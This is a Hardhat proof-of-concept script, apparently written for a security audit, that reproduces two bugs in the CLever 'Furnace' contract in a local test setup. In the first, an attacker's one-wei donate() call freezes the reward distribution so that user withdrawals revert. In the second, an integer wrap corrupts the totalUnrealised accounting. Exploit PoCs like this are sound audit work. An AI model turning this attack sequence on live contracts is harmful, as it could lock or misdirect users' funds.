// H1: Furnace rate-0 freeze via CLeverCVXLocker.donate(1)   (bundle bytecode, solc 0.7.6)
// H2: Furnace totalUnrealised wrap on full exit               (bundle bytecode, solc 0.7.6)
const hre = require("hardhat");
const { ethers } = hre;

const CVX = "0x4e3FBD56CD56c3e72c1403e103b45Db9da5B9D2B";
const CVX_REWARD_POOL = "0xCF50b810E57Ac33B91dCF525C6ddd9881B139332";
const E18 = 10n ** 18n;
const DAY = 86400;

async function etch(addr, factoryName, args = []) {
  const f = await ethers.getContractFactory(factoryName);
  const c = await f.deploy(...args);
  await c.waitForDeployment();
  await hre.network.provider.send("hardhat_setCode", [addr, await ethers.provider.getCode(await c.getAddress())]);
  return ethers.getContractAt(factoryName, addr);
}
async function tryTx(label, p) {
  try {
    const tx = await p; await tx.wait();
    console.log(`  ${label.padEnd(64)} -> ok`);
    return true;
  } catch (e) {
    const m = (e.shortMessage || e.message || "").replace(/\s+/g, " ").slice(0, 110);
    console.log(`  ${label.padEnd(64)} -> REVERT ${m}`);
    return false;
  }
}
async function now() { return (await ethers.provider.getBlock("latest")).timestamp; }
async function warp(t) { await hre.network.provider.send("evm_setNextBlockTimestamp", [t]); }

async function deployFurnace(gov, clev, owner, P) {
  const F = await (await ethers.getContractFactory("contracts/bundle/clever/Furnace.sol:Furnace")).deploy();
  await F.waitForDeployment();
  await (await F.initialize(gov.address, await clev.getAddress(), owner.address, owner.address, 0, 0)).wait();
  if (P) await (await F.connect(gov).updatePeriodLength(P)).wait();
  return F;
}

async function main() {
  const [owner, gov, alice, bob, carol, keeper, attacker] = await ethers.getSigners();
  const cvx = await etch(CVX, "CleverMockToken");
  await etch(CVX_REWARD_POOL, "MockCvxRewardPool");
  const clev = await (await ethers.getContractFactory("CleverMockToken")).deploy();
  await clev.waitForDeployment();

  // ---------------- H1 ----------------
  console.log("=== H1: Furnace (P = 7 days) frozen by CLeverCVXLocker.donate(1) ===");
  const F = await deployFurnace(gov, clev, owner, 7 * DAY);
  const Fa = await F.getAddress();
  const L = await (await ethers.getContractFactory("contracts/bundle/clever/CLeverCVXLocker.sol:CLeverCVXLocker")).deploy();
  await L.waitForDeployment();
  const La = await L.getAddress();
  // CLeverCVXLocker has no initializer in the bundle (L13120-L13147 commented out): set `furnace` (slot 110)
  await hre.network.provider.send("hardhat_setStorageAt", [La, ethers.toQuantity(110), ethers.zeroPadValue(Fa, 32)]);
  console.log("  locker.furnace() =", await L.furnace(), " (expected", Fa + ")");
  await (await F.updateWhitelists([La, keeper.address], true)).wait();

  for (const [u, a] of [[alice, 1000n], [bob, 500n]]) {
    await (await clev.mint(u.address, a * E18)).wait();
    await (await clev.connect(u).approve(Fa, a * E18)).wait();
    await tryTx(`${u === alice ? "alice" : "bob"}.deposit(${a}e18 clevCVX)`, F.connect(u).deposit(a * E18));
  }
  await (await cvx.mint(keeper.address, 1000n * E18)).wait();
  await (await cvx.connect(keeper).approve(Fa, 1000n * E18)).wait();
  await tryTx("keeper.distribute(keeper, 100e18 CVX)  [period starts]", F.connect(keeper).distribute(keeper.address, 100n * E18));
  let t0 = await now();
  await warp(t0 + 3 * DAY);
  await tryTx("anyone.updatePendingDistribution() @+3d", F.updatePendingDistribution());
  await warp(t0 + 8 * DAY);
  await tryTx("anyone.updatePendingDistribution() @+8d (> finishAt)", F.updatePendingDistribution());
  let ri = await F.rewardInfo();
  console.log(`  rewardInfo: rate=${ri.ratePerSecond} P=${ri.periodLength} lastUpdate=${ri.lastUpdate} finishAt=${ri.finishAt}`);

  await (await cvx.mint(attacker.address, 1n)).wait();
  await (await cvx.connect(attacker).approve(La, 1n)).wait();
  await tryTx("attacker: CLeverCVXLocker.donate(1)", L.connect(attacker).donate(1n));
  ri = await F.rewardInfo();
  console.log(`  rewardInfo: rate=${ri.ratePerSecond} lastUpdate=${ri.lastUpdate} finishAt=${ri.finishAt}  totalUnrealised=${await F.totalUnrealised()}`);
  await warp((await now()) + 12);
  await tryTx("alice.withdrawAll(alice)", F.connect(alice).withdrawAll(alice.address));
  await tryTx("alice.claim(alice)", F.connect(alice).claim(alice.address));
  await tryTx("bob.exit(bob)", F.connect(bob).exit(bob.address));
  await (await clev.mint(carol.address, 10n * E18)).wait();
  await (await clev.connect(carol).approve(Fa, 10n * E18)).wait();
  await tryTx("carol.deposit(10e18)", F.connect(carol).deposit(10n * E18));
  await tryTx("keeper.distribute(keeper, 100e18)  [next honest harvest]", F.connect(keeper).distribute(keeper.address, 100n * E18));
  await tryTx("anyone.updatePendingDistribution()", F.updatePendingDistribution());
  await warp((await now()) + 365 * DAY);
  await tryTx("alice.withdrawAll(alice) @ +1 year", F.connect(alice).withdrawAll(alice.address));
  await tryTx("gov.updatePeriodLength(0)", F.connect(gov).updatePeriodLength(0));
  await tryTx("alice.withdrawAll(alice)", F.connect(alice).withdrawAll(alice.address));
  await tryTx("gov.updatePeriodLength(7 days)  [re-enable linear mode]", F.connect(gov).updatePeriodLength(7 * DAY));
  await tryTx("bob.exit(bob)", F.connect(bob).exit(bob.address));

  // ---------------- H2 ----------------
  console.log("\n=== H2: Furnace (P = 0) totalUnrealised wraps on full exit ===");
  const G = await deployFurnace(gov, clev, owner, 0);
  const Ga = await G.getAddress();
  await (await G.updateWhitelists([keeper.address], true)).wait();
  await (await cvx.connect(keeper).approve(Ga, 10n ** 30n)).wait();
  await (await cvx.mint(keeper.address, 10000n * E18)).wait();
  for (const [u, a, n] of [[alice, 1n * E18, "alice"], [bob, 2n * E18, "bob"]]) {
    await (await clev.mint(u.address, a)).wait();
    await (await clev.connect(u).approve(Ga, a)).wait();
    await tryTx(`${n}.deposit(${a})`, G.connect(u).deposit(a));
  }
  await tryTx("keeper.distribute(keeper, 1e18)", G.connect(keeper).distribute(keeper.address, E18));
  for (const [u, n] of [[alice, "alice"], [bob, "bob"]]) {
    const ui = await G.getUserInfo(u.address);
    console.log(`  ${n}.getUserInfo = (unrealised ${ui[0]}, realised ${ui[1]})`);
  }
  console.log(`  totalUnrealised = ${await G.totalUnrealised()}`);
  await tryTx("alice.exit(alice)", G.connect(alice).exit(alice.address));
  await tryTx("bob.exit(bob)", G.connect(bob).exit(bob.address));
  const tu = await G.totalUnrealised();
  console.log(`  totalUnrealised = ${tu}  (== 2^128-1 ? ${tu === (1n << 128n) - 1n})   totalRealised = ${await G.totalRealised()}`);
  await (await clev.mint(carol.address, 10n * E18)).wait();
  await (await clev.connect(carol).approve(Ga, 10n * E18)).wait();
  await tryTx("carol.deposit(10e18)", G.connect(carol).deposit(10n * E18));
  await tryTx("keeper.distribute(keeper, 1000e18)", G.connect(keeper).distribute(keeper.address, 1000n * E18));
  console.log(`  totalUnrealised = ${await G.totalUnrealised()} totalRealised = ${await G.totalRealised()}`);
  await tryTx("carol.deposit(10e18)  (headroom now 1000e18)", G.connect(carol).deposit(10n * E18));
  await tryTx("keeper.distribute(keeper, 1000e18)", G.connect(keeper).distribute(keeper.address, 1000n * E18));
  const cu = await G.getUserInfo(carol.address);
  console.log(`  carol.getUserInfo = (unrealised ${cu[0]}, realised ${cu[1]})  <- from a 1000e18 distribution`);
  console.log(`  CVX held by Furnace = ${await cvx.balanceOf(Ga)} ; claimable by any user = ${cu[1]}`);
}

main().catch((e) => { console.error(e); process.exit(1); });
